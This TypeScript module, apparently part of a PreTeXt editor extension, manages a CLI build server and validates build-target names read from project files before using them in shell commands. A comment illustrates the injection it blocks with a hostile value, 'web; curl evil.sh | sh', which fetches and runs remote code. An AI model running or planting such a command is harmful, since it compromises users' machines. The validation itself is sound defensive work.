/**
 * The PreTeXt CLI's build server, as consumed by the live preview panel's
 * "Full build" mode.
 *
 * The panel's default mode renders with the in-process XSLT engine
 * (instantPreview.ts) — fast, but it renders one page with CDN assets and no
 * `pretext generate` artifacts. Full-build mode shows the real thing instead:
 * whatever `pretext build <target>` produced, served by `pretext view` and
 * embedded as an iframe. That needs a working PreTeXt CLI installation, which
 * the instant preview otherwise exists to avoid requiring.
 *
 * At most one server runs at a time; switching targets stops the old one.
 */

import { ChildProcess, spawn } from "child_process";
import * as fs from "fs";
import * as path from "path";
import { cli } from "./cli";
import { pretextOutputChannel } from "./ui";
import * as utils from "./utils";

/** Which build to serve. */
export interface CliTarget {
  /** Project root (the directory holding project.ptx). */
  projectDir: string;
  /** Target name from the manifest, e.g. "web". */
  target: string;
}

let serverProcess: ChildProcess | undefined;
let serverUrl: string | undefined;
let servingKey: string | undefined;
/** The target behind `servingKey`, kept whole so nothing has to re-parse it. */
let servingTarget: CliTarget | undefined;
/** In-flight start, so concurrent mode switches share one server. */
let pendingStart: Promise<string> | undefined;

/** `pretext view` prints its URL on stdout; give it a generous window. */
const SERVER_START_TIMEOUT_MS = 90_000;

/**
 * The line `pretext view` prints for the target being served. Matched against
 * the accumulated output because the CLI's stdout arrives in arbitrary chunks.
 */
const TARGET_URL_PATTERN =
  /(?:will be available|Opening browser)[\s\S]*?(https?:\/\/[^\s]*\/output\/[^\s]+)/;
/** Last-resort match, tried only once the pattern above has timed out. */
const ANY_LOCAL_URL_PATTERN =
  /(https?:\/\/(?:localhost|127\.0\.0\.1)(?::\d+)?\/[^\s]*)/;

/**
 * Target names that are safe to interpolate into a shell command line.
 *
 * `target.target` is read out of the project's `project.ptx`, so it is exactly
 * as trustworthy as the repository the user opened — which, for a format
 * people routinely clone from strangers, is not very. Every command below runs
 * through a shell, so an unvalidated name like `web; curl evil.sh | sh` would
 * execute the moment the user switched to full-build mode.
 *
 * Requiring an alphanumeric first character also rejects `-`-prefixed names,
 * which would otherwise smuggle extra flags into `pretext build`/`view`, and
 * the character class rules out the `..` and separators that would let a name
 * escape `output/<target>` in hasBuiltOutput.
 *
 * Real PreTeXt target names ("web", "print", "html-full") all pass.
 */
const SAFE_TARGET_NAME = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;

/**
 * Why validate rather than drop `shell: true` and pass argv?
 *
 * `cli.cmd()` returns a whole command line ("python3 -m pretext", "pretext"),
 * not an executable path, so there is no argv[0] to hand spawn directly.
 * Splitting it on whitespace would break user-configured interpreter paths
 * containing spaces, and losing the shell would break `.cmd`/`.bat` launchers
 * on Windows — neither testable from here. Validating the one attacker-
 * controlled value closes the injection outright, which is what matters.
 */
function isSafeTarget(target: CliTarget): boolean {
  return SAFE_TARGET_NAME.test(target.target);
}

/** Human-readable rejection, for surfacing to the user. */
function unsafeTargetError(target: CliTarget): Error {
  return new Error(
    `The target name ${JSON.stringify(target.target)} in project.ptx ` +
      `contains characters that are not allowed in a build target ` +
      `(letters, digits, dot, underscore and hyphen only). Refusing to run ` +
      `the PreTeXt CLI with it.`,
  );
}

function keyOf(target: CliTarget): string {
  return `${target.projectDir}::${target.target}`;
}

function log(message: string): void {
  pretextOutputChannel.appendLine(`[Full Build] ${message}`);
}

/** True when `output/<target>` already holds a CLI-produced HTML build. */
export function hasBuiltOutput(target: CliTarget): boolean {
  if (!isSafeTarget(target)) {
    return false; // never join an unvalidated name onto a filesystem path
  }
  try {
    return fs
      .readdirSync(path.join(target.projectDir, "output", target.target))
      .some((file) => file.endsWith(".html"));
  } catch {
    return false;
  }
}

/** URL of the running server, when one is up for this exact target. */
export function servedUrl(target: CliTarget): string | undefined {
  return servingKey === keyOf(target) ? serverUrl : undefined;
}

/**
 * A small script appended to every built HTML page so the preview panel can
 * keep its place across rebuilds.
 *
 * The served build is cross-origin to the webview, so the wrapper cannot read
 * `iframe.contentWindow.location` to find out which page the reader navigated
 * to, nor call `location.reload()` on it. Both directions therefore go through
 * postMessage, which does work cross-origin: each page announces its path on
 * load, and reloads itself when the panel asks. Reloading in place (rather
 * than re-pointing the iframe at a remembered URL) also means the browser
 * restores the scroll position for free.
 *
 * This rewrites files in `output/`, which are build artifacts regenerated by
 * every `pretext build` — the same thing livePreview.ts does for its inverse
 * search. The marker attribute keeps a re-run from stacking copies.
 */
const FRAME_BRIDGE_MARKER = "data-pretext-tools-frame-bridge";

const FRAME_BRIDGE_SCRIPT = [
  `<script ${FRAME_BRIDGE_MARKER}="true">`,
  "(function () {",
  "  if (window.__ptxFrameBridge) { return; }",
  "  window.__ptxFrameBridge = true;",
  "  function report() {",
  "    try {",
  "      parent.postMessage({",
  "        command: 'ptxFramePath',",
  "        path: location.pathname + location.search + location.hash",
  "      }, '*');",
  "    } catch (e) { /* not framed */ }",
  "  }",
  "  report();",
  "  window.addEventListener('hashchange', report);",
  "  window.addEventListener('pageshow', report);",
  "  window.addEventListener('message', function (event) {",
  "    if (event.data && event.data.command === 'ptxFrameReload') {",
  "      location.reload();",
  "    }",
  "  });",
  "})();",
  "</script>",
].join("\n");

/**
 * Append {@link FRAME_BRIDGE_SCRIPT} to the target's built HTML pages.
 * Best effort: a page we cannot rewrite simply loses place-keeping, and the
 * panel falls back to reloading at the start page.
 */
function injectFrameBridge(target: CliTarget): void {
  if (!isSafeTarget(target)) {
    return;
  }
  const outputDir = path.join(target.projectDir, "output", target.target);
  let files: string[];
  try {
    files = fs.readdirSync(outputDir).filter((f) => f.endsWith(".html"));
  } catch {
    return;
  }
  let injected = 0;
  for (const file of files) {
    const filePath = path.join(outputDir, file);
    try {
      const content = fs.readFileSync(filePath, "utf-8");
      if (
        content.includes(FRAME_BRIDGE_MARKER) ||
        !content.includes("</body>")
      ) {
        continue;
      }
      fs.writeFileSync(
        filePath,
        content.replace("</body>", `${FRAME_BRIDGE_SCRIPT}\n</body>`),
        "utf-8",
      );
      injected++;
    } catch {
      // skip files we cannot read or write
    }
  }
  if (injected > 0) {
    log(`Added the preview bridge to ${injected} built page(s).`);
  }
}

/** Run a `pretext` subcommand to completion, streaming output to the log. */
function runCli(args: string, cwd: string): Promise<number | null> {
  return new Promise((resolve) => {
    const command = `${cli.cmd()} ${args}`;
    log(`Running: ${command}`);
    const child = spawn(command, [], { cwd, shell: true });
    const stream = (data: Buffer) => {
      const text = utils.stripColorCodes(data.toString()).trim();
      if (text) {
        pretextOutputChannel.appendLine(text);
      }
    };
    child.stdout?.on("data", stream);
    child.stderr?.on("data", stream);
    child.on("error", (err) => {
      log(`Could not run the PreTeXt CLI: ${String(err)}`);
      resolve(null);
    });
    child.on("close", (code) => {
      log(`\`${args}\` exited with code ${code}`);
      resolve(code);
    });
  });
}

/**
 * Run `pretext build <target>`.
 *
 * Resolves to whether HTML output exists afterwards rather than to the exit
 * code: PreTeXt exits non-zero when optional tools (Sage, Asymptote) are
 * missing even though the HTML built fine, and a usable build is what the
 * preview actually cares about.
 */
export async function runCliBuild(target: CliTarget): Promise<boolean> {
  if (!isSafeTarget(target)) {
    log(unsafeTargetError(target).message);
    return false;
  }
  await runCli(`build ${target.target}`, target.projectDir);
  if (!hasBuiltOutput(target)) {
    return false;
  }
  // The build overwrote the pages, taking the bridge with them.
  injectFrameBridge(target);
  return true;
}

/**
 * Return the URL of a running `pretext view` server for this target, starting
 * one (and building first, if there is nothing to serve) when needed.
 *
 * Rejects with a message suitable for showing to the user.
 */
export async function ensureCliServer(target: CliTarget): Promise<string> {
  if (!isSafeTarget(target)) {
    throw unsafeTargetError(target);
  }
  const key = keyOf(target);
  if (servingKey === key) {
    if (serverUrl) {
      return serverUrl;
    }
    if (pendingStart) {
      return pendingStart;
    }
  }
  // A different target was being served (or is mid-start) — take it down.
  stopCliServer();
  servingKey = key;
  servingTarget = target;
  pendingStart = startServer(target).finally(() => {
    pendingStart = undefined;
  });
  return pendingStart;
}

async function startServer(target: CliTarget): Promise<string> {
  if (!hasBuiltOutput(target)) {
    log(`No HTML output for "${target.target}" yet — building it first.`);
    if (!(await runCliBuild(target))) {
      throw new Error(
        `\`pretext build ${target.target}\` produced no HTML output. ` +
          `Check the PreTeXt output log.`,
      );
    }
  } else {
    // Output built by someone else (an earlier session, a terminal) has no
    // bridge in it yet.
    injectFrameBridge(target);
  }

  return new Promise<string>((resolve, reject) => {
    // --restart-server clears out a stale server left by an earlier session.
    const command = `${cli.cmd()} view --no-launch --restart-server ${target.target}`;
    log(`Running: ${command}`);
    const child = spawn(command, [], { cwd: target.projectDir, shell: true });
    serverProcess = child;

    let output = "";
    let settled = false;

    const timer = setTimeout(() => {
      // The expected banner never appeared; accept any local URL it did print
      // before giving up, since the server itself is probably fine.
      const fallback = ANY_LOCAL_URL_PATTERN.exec(output);
      if (fallback) {
        log(`Server URL not announced as expected; using ${fallback[1]}`);
        finish(fallback[1]);
        return;
      }
      fail(
        new Error(
          `\`pretext view\` did not report a URL within ` +
            `${SERVER_START_TIMEOUT_MS / 1000}s. Check the PreTeXt output log.`,
        ),
      );
    }, SERVER_START_TIMEOUT_MS);

    function finish(url: string): void {
      if (settled) {
        return;
      }
      settled = true;
      clearTimeout(timer);
      serverUrl = url;
      log(`Serving ${target.target} at ${url}`);
      resolve(url);
    }

    function fail(err: Error): void {
      if (settled) {
        return;
      }
      settled = true;
      clearTimeout(timer);
      log(err.message);
      reject(err);
    }

    const consume = (data: Buffer) => {
      const text = utils.stripColorCodes(data.toString());
      if (text.trim()) {
        pretextOutputChannel.appendLine(text.trim());
      }
      output += text;
      const match = TARGET_URL_PATTERN.exec(output);
      if (match) {
        finish(match[1]);
      }
    };

    child.stdout?.on("data", consume);
    child.stderr?.on("data", consume);

    child.on("error", (err) => {
      if (serverProcess === child) {
        serverProcess = undefined;
      }
      fail(
        new Error(
          `Could not start the PreTeXt CLI (${String(err)}). Full-build mode ` +
            `needs a working \`pretext\` installation.`,
        ),
      );
    });

    child.on("close", (code) => {
      if (serverProcess === child) {
        serverProcess = undefined;
        serverUrl = undefined;
      }
      fail(
        new Error(
          `The \`pretext view\` server exited (code ${code}) before it was ` +
            `ready. Check the PreTeXt output log.`,
        ),
      );
    });
  });
}

/** Stop the running server, if any. Safe to call when nothing is running. */
export function stopCliServer(): void {
  const child = serverProcess;
  const stopping = servingTarget;
  serverProcess = undefined;
  serverUrl = undefined;
  servingKey = undefined;
  servingTarget = undefined;
  pendingStart = undefined;

  if (child && !child.killed) {
    child.kill();
  }
  // Only ever reachable for a target ensureCliServer already validated, but
  // this is the last hop to a shell, so it re-checks rather than assume.
  if (!stopping || !isSafeTarget(stopping)) {
    return;
  }
  // Killing our child does not necessarily stop the server it spawned; ask the
  // CLI to shut it down too. Best effort — nothing useful to do on failure.
  try {
    spawn(`${cli.cmd()} view --stop-server ${stopping.target}`, [], {
      cwd: stopping.projectDir,
      shell: true,
    });
  } catch {
    // best effort
  }
}
